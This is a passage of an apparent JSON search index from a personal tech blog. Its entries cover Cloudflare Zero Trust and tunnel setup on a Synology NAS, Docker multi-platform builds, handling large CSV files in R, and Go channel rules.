\u0026gt; Manage \u0026gt; Domain \u0026gt; nas.ruru910.com. Split Tunnels: Exclude IPs and domains \u0026gt; Manage. Delete the IP range of nas.ruru910.com. 3. Filter network traffic with Gateway 1. Enable the Gateway proxy In Zero Trust, go to Settings \u0026gt; Network. Gateway Logging: Capture all. Firewall: Proxy(TCP, UDP, ICMP), WARP to WARP, AV inspection. 2. Create Zero Trust policies Go to Access \u0026gt; Applications \u0026gt; Add an application \u0026gt; Private Network \u0026gt; Application Type \u0026gt; Destination IP. For Value, enter the IP address for your application (for example, 10.128.0.7). Modify policy \u0026gt; identify \u0026gt; Selector \u0026gt; User Email \u0026gt; in \u0026gt; @ruru910.com. ","date":"September 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230926-cloudflare/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/connect-private-networks/\" target=\"_blank\" rel=\"noopener\"\u003eConnect private networks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/configure-warp/route-traffic/local-domains/\" target=\"_blank\" rel=\"noopener\"\u003eConfigure Local Domain Fallback\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/exclude-traffic/split-tunnels/\" target=\"_blank\" rel=\"noopener\"\u003eConfigure Split Tunnels\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/exclude-traffic/\" target=\"_blank\" rel=\"noopener\"\u003eTraffic routing with WARP\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"1-set-up-the-client\"\u003e1. Set up the client\u003c/h3\u003e\n\u003ch4 id=\"create-device-enrollment-rules\"\u003eCreate device enrollment rules\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCreate device enrollment rules to determine which devices can enroll to Zero Trust organization.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch5 id=\"set-device-enrollment-permissions\"\u003eSet device enrollment permissions\u003c/h5\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device enrollment \u0026gt; Device enrollment permissions \u0026gt; Manage.\u003c/li\u003e\n\u003cli\u003eRules \u0026gt; Policies \u0026gt; Add a rule \u0026gt; Include \u0026gt; Selector \u0026gt; Emails ending in \u0026gt; Value \u0026gt; @ruru910.com.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"2-route-private-network-ips-through-warp\"\u003e2. Route private network IPs through WARP\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device settings \u0026gt; Profile settings \u0026gt; Profile name \u0026gt; Default \u0026gt; Configure.\u003c/li\u003e\n\u003cli\u003eConfigure settings:\n\u003col\u003e\n\u003cli\u003eEnabled: Captive portal detection, Mode switch, Allow device to leave organization, Allow updates.\u003c/li\u003e\n\u003cli\u003eService mode: Gateway with WARP.\u003c/li\u003e\n\u003cli\u003eLocal Domain Fallback \u0026gt; Manage \u0026gt; Domain \u0026gt; nas.ruru910.com.\u003c/li\u003e\n\u003cli\u003eSplit Tunnels: Exclude IPs and domains \u0026gt; Manage.\n\u003cul\u003e\n\u003cli\u003eDelete the IP range of nas.ruru910.com.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"3-filter-network-traffic-with-gateway\"\u003e3. Filter network traffic with Gateway\u003c/h3\u003e\n\u003ch4 id=\"1-enable-the-gateway-proxy\"\u003e1. Enable the Gateway proxy\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eIn Zero Trust, go to Settings \u0026gt; Network.\n\u003col\u003e\n\u003cli\u003eGateway Logging: Capture all.\u003c/li\u003e\n\u003cli\u003eFirewall: Proxy(TCP, UDP, ICMP), WARP to WARP, AV inspection.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"2-create-zero-trust-policies\"\u003e2. \u003ca href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/connect-private-networks/#create-zero-trust-policies\" target=\"_blank\" rel=\"noopener\"\u003eCreate Zero Trust policies\u003c/a\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eGo to Access \u0026gt; Applications \u0026gt; Add an application \u0026gt; Private Network \u0026gt; Application Type \u0026gt; Destination IP.\u003c/li\u003e\n\u003cli\u003eFor Value, enter the IP address for your application (for example, 10.128.0.7).\u003c/li\u003e\n\u003cli\u003eModify policy \u0026gt; identify \u0026gt; Selector \u0026gt; User Email \u0026gt; in \u0026gt; @ruru910.com.\u003c/li\u003e\n\u003c/ol\u003e","tags":["Cloudflare","zero trust"],"title":"Cloudflare Zero Trust"},{"categories":["Cloudflare","Synology"],"contents":" CLOUDFLARE tunnel on SYNOLOGY. (the raw way) Setup Synology Create a directory in docker directory, such as cloudflare-tunnel. Download cloudflared/cloudflared image to registry. ssh to admin@synology Change cloudflare-tunnel owner, sudo chown -R 65532:65532 /volume1/docker/cloudflare-tunnel. Run containers - cloudflared tunnel login Run container and mount volume docker/cloudflare-tunnel:/home/nonroot/.cloudflared. Select Use the same network as Docker Host in network tab. Add command tunnel login in envorinment tab. Go to container log, and copy login url. Paste url to browser and authorize the zone. Export the container setting json to the directory cloudflare-tunnel. - cloudflared tunnel create synology-tunnel Edit the container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel create synology-tunnel. Import the container setting json and run a new container. The container will stop and create tunnel config json in cloudflare-tunnel. Create config.yml and write ingress rules. In config.yml, tunnel value is the same as the tunnel config json name, and credentials-file is /home/nonroot/.cloudflared/tunnel config json Export the second container setting json to the directory cloudflare-tunnel. - cloudflared tunnel route dns synology-tunnel synology.ruru910.com Edit the second container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel route dns synology-tunnel synology.ruru910.com. Import the second container setting json and run a new container. The container will stop and create a dns record mapping domain to the tunnel. - cloudflared tunnel run synology-tunnel Edit the second container setting json in the the directory cloudflare-tunnel, modify cmd. tunnel run synology-tunnel. Import the second container setting json and run a new container. The tunnel now is connectable. ","date":"September 25, 2023","hero":"/posts/2023/20230925-cloudflare/cloudflare.svg","permalink":"https://linzeyan.github.io/posts/2023/20230925-cloudflare/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=5IrtNxfzH1o\" target=\"_blank\" rel=\"noopener\"\u003eCLOUDFLARE tunnel on SYNOLOGY. (the raw way)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"setup-synology\"\u003eSetup Synology\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eCreate a directory in docker directory, such as \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDownload cloudflared/cloudflared image to registry.\u003c/li\u003e\n\u003cli\u003essh to admin@synology\u003c/li\u003e\n\u003cli\u003eChange \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e owner, \u003ccode\u003esudo chown -R 65532:65532 /volume1/docker/cloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"run-containers\"\u003eRun containers\u003c/h3\u003e\n\u003ch4 id=\"--cloudflared-tunnel-login\"\u003e- \u003ccode\u003ecloudflared tunnel login\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eRun container and mount volume \u003ccode\u003edocker/cloudflare-tunnel:/home/nonroot/.cloudflared\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSelect \u003ccode\u003eUse the same network as Docker Host\u003c/code\u003e in network tab.\u003c/li\u003e\n\u003cli\u003eAdd command \u003ccode\u003etunnel login\u003c/code\u003e in envorinment tab.\u003c/li\u003e\n\u003cli\u003eGo to container log, and copy login url.\u003c/li\u003e\n\u003cli\u003ePaste url to browser and authorize the zone.\u003c/li\u003e\n\u003cli\u003eExport the container setting json to the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-create-synology-tunnel\"\u003e- \u003ccode\u003ecloudflared tunnel create synology-tunnel\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel create synology-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe container will stop and create tunnel config json in \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCreate config.yml and write ingress rules.\u003c/li\u003e\n\u003cli\u003eIn config.yml, tunnel value is the same as the tunnel config json name, and credentials-file is \u003ccode\u003e/home/nonroot/.cloudflared/tunnel config json\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExport the second container setting json to the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-route-dns-synology-tunnel-synologyruru910com\"\u003e- \u003ccode\u003ecloudflared tunnel route dns synology-tunnel synology.ruru910.com\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the second container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel route dns synology-tunnel synology.ruru910.com\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the second container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe container will stop and create a dns record mapping domain to the tunnel.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"--cloudflared-tunnel-run-synology-tunnel\"\u003e- \u003ccode\u003ecloudflared tunnel run synology-tunnel\u003c/code\u003e\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eEdit the second container setting json in the the directory \u003ccode\u003ecloudflare-tunnel\u003c/code\u003e, modify cmd. \u003ccode\u003etunnel run synology-tunnel\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eImport the second container setting json and run a new container.\u003c/li\u003e\n\u003cli\u003eThe tunnel now is connectable.\u003c/li\u003e\n\u003c/ol\u003e","tags":["Cloudflare","tunnel","Synology"],"title":"Cloudflare tunnel on Synology"},{"categories":["URL","Docker"],"contents":" Faster Multi-Platform Builds: Dockerfile Cross-Compilation Guide method docker buildx create --use FROM --platform=linux/amd64 debian / FROM --platform=$BUILDPLATFORM debian variables BUILDPLATFORM — matches the current machine. (e.g. linux/amd64) BUILDOS — os component of BUILDPLATFORM, e.g. linux BUILDARCH — e.g. amd64, arm64, riscv64 BUILDVARIANT — used to set ARM variant, e.g. v7 TARGETPLATFORM — The value set with --platform flag on build TARGETOS - OS component from --platform, e.g. linux TARGETARCH - Architecture from --platform, e.g. arm64 TARGETVARIANT example before FROM golang:1.17-alpine AS build WORKDIR /src COPY . . RUN go build -o /out/myapp . FROM alpine COPY --from=build /out/myapp /bin after FROM --platform=$BUILDPLATFORM golang:1.17-alpine AS build WORKDIR /src ARG TARGETOS TARGETARCH RUN --mount=target=. \\ --mount=type=cache,target=/root/.cache/go-build \\ --mount=type=cache,target=/go/pkg \\ GOOS=$TARGETOS GOARCH=$TARGETARCH go build -o /out/myapp . FROM alpine COPY --from=build /out/myapp /bin ","date":"September 4, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230904-faster-multi-platform-builds-dockerfile-cross-compilation-guide/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.docker.com/blog/faster-multi-platform-builds-dockerfile-cross-compilation-guide/\" target=\"_blank\" rel=\"noopener\"\u003eFaster Multi-Platform Builds: Dockerfile Cross-Compilation Guide\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"method\"\u003emethod\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx create --use\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eFROM --platform=linux/amd64 debian\u003c/code\u003e / \u003ccode\u003eFROM --platform=$BUILDPLATFORM debian\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003evariables\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eBUILDPLATFORM — matches the current machine. (e.g. linux/amd64)\n\nBUILDOS — os component of BUILDPLATFORM, e.g. linux\n\nBUILDARCH — e.g. amd64, arm64, riscv64\n\nBUILDVARIANT — used to set ARM variant, e.g. v7\n\nTARGETPLATFORM — The value set with --platform flag on build\n\nTARGETOS - OS component from --platform, e.g. linux\n\nTARGETARCH - Architecture from --platform, e.g. arm64\n\nTARGETVARIANT\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"example\"\u003eexample\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ebefore\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.17-alpine AS build\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e /src\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e . .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e go build -o /out/myapp .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuild /out/myapp /bin\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eafter\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e --platform=$BUILDPLATFORM golang:1.17-alpine AS build\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e /src\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e TARGETOS TARGETARCH\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etarget\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecache,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.cache/go-build \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecache,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/go/pkg \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    GOOS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$TARGETOS GOARCH\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$TARGETARCH go build -o /out/myapp .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuild /out/myapp /bin\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Docker"],"title":"Faster Multi-Platform Builds: Dockerfile Cross-Compilation Guide"},{"categories":["URL","R"],"contents":" How to deal with a 50GB large csv file in r language? question all \u0026lt;- read.csv.ffdf( file=\u0026#34;\u0026lt;path of large file\u0026gt;\u0026#34;, sep = \u0026#34;,\u0026#34;, header=TRUE, VERBOSE=TRUE, first.rows=10000, next.rows=50000, ) answer library(sqldf) iris2 \u0026lt;- read.csv.sql(\u0026#34;iris.csv\u0026#34;, sql = \u0026#34;select * from file where Species = \u0026#39;setosa\u0026#39; \u0026#34;) ","date":"July 20, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230720-how-to-deal-with-a-50gb-large-csv-file-in-r-language/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/39678940/how-to-deal-with-a-50gb-large-csv-file-in-r-language\" target=\"_blank\" rel=\"noopener\"\u003eHow to deal with a 50GB large csv file in r language?\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"question\"\u003equestion\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-r\" data-lang=\"r\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eall \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread.csv.ffdf\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026lt;path of large file\u0026gt;\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  sep \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;,\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  VERBOSE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  first.rows\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  next.rows\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e50000\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  )\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"answer\"\u003eanswer\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-r\" data-lang=\"r\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elibrary\u003c/span\u003e(sqldf)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiris2 \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread.csv.sql\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;iris.csv\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sql \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select * from file where Species = \u0026#39;setosa\u0026#39; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","R"],"title":"How to deal with a 50GB large csv file in r language?"},{"categories":["URL","Go","channel"],"contents":" channel 的 15 条规则和底层实现 操作规则 操作 nil 已关闭的 channel 未关闭有缓冲区的 channel 未关闭无缓冲区的 channel 关闭 panic panic 成功关闭，然后可以读取缓冲区的值，读取完之后，继续读取到的是 channel 类型的默认值 成功关闭，之后读取到的是 channel 类型的默认值 接收 阻塞 不阻塞，读取到的是 channel 类型的默认值 不阻塞，正常读取值 阻塞 发送 阻塞 panic 不阻塞，正常写入值 阻塞 编译规则 操作 channel 類型 結果 接收 只写 channel 编译错误 发送 只读 channel 编译错误 关闭 只读 channel 编译错误 ","date":"June 22, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230622-go-channel-rules/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/AsytcOBg0XpTnPzDq7iEhQ\" target=\"_blank\" rel=\"noopener\"\u003echannel 的 15 条规则和底层实现\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"操作规则\"\u003e操作规则\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth style=\"text-align: center\"\u003e操作\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003enil\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e已关闭的 channel\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e未关闭有缓冲区的 channel\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e未关闭无缓冲区的 channel\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e关闭\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e成功关闭，然后可以读取缓冲区的值，读取完之后，继续读取到的是 channel 类型的默认值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e成功关闭，之后读取到的是 channel 类型的默认值\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e接收\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，读取到的是 channel 类型的默认值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，正常读取值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e发送\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003epanic\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e不阻塞，正常写入值\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e阻塞\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"编译规则\"\u003e编译规则\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth style=\"text-align: center\"\u003e操作\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003echannel 類型\u003c/th\u003e\n          \u003cth style=\"text-align: center\"\u003e結果\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e接收\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只写 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e发送\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只读 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n      